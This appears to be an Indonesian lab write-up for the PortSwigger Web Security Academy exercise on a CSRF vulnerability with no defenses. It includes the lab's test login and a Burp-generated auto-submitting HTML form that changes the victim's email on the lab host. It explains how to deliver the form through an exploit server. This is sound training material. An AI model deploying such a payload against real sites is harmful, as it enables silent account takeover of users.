
# CSRF vulnerability with no defenses

Lab ini memiliki fungsi untuk mengubah alamat email yang **rentan terhadap serangan CSRF**.

**Untuk menyelesaikan lab ini**, kita harus membuat HTML yang akan memanfaatkan **CSRF attack** untuk mengubah alamat email milik orang yang mengakses halaman tersebut, lalu mengunggah HTML tersebut ke exploit server.

Anda dapat login ke akun Anda sendiri dengan kredensial berikut:
```
Username: wiener
Password: peter
```

> **Hint**: Anda tidak bisa mendaftarkan atau mengubah ke alamat email yang sudah terpakai oleh pengguna lain. Jika Anda mengubah email Anda sendiri saat menguji exploit, pastikan menggunakan alamat email yang berbeda saat mengirimkan exploit final ke korban.

---

### Referensi
- [PortSwigger CSRF Documentation](https://portswigger.net/web-security/csrf)

---

### Fungsi untuk memperbarui email pengguna

![img](images/CSRF%20vulnerability%20with%20no%20defenses/1.png)

Formulir ini melakukan **request POST**. Dengan menggunakan Burp Suite (menu **Engagement tools** > **Generate CSRF PoC**), akan dihasilkan HTML **proof of concept** CSRF.

![img](images/CSRF%20vulnerability%20with%20no%20defenses/2.png)

Di bawah ini adalah **contoh PoC** yang dihasilkan:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac5004c04ed095e819302fc004d00f6.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Penjelasan Singkat PoC

- **Form HTML** mengarahkan request ke endpoint `/my-account/change-email` dengan method **POST**.
- **Field tersembunyi (`<input type="hidden">`)** berisi `name="email"` dan value yang dituju, misalnya `test2@test.com`.  
- **Script** otomatis men-submit form ( `document.forms[0].submit()` ), sehingga korban tidak perlu menekan tombol secara manual.  
- Dengan demikian, **saat korban mengunjungi halaman HTML ini**, browser korban akan mengirim request POST ke situs rentan **untuk mengubah email korban** ke `test2@test.com` (atau alamat lain yang Anda tentukan).

> **Jangan lupa** untuk menggunakan alamat email yang **belum terpakai** dalam aplikasi ini agar exploit berhasil.

**Langkah akhir**: Unggah HTML PoC ini ke **exploit server** dan kirim link tersebut ke korban. Jika korban masih login ke situs tersebut dan membuka link itu, maka email korban akan berubah.
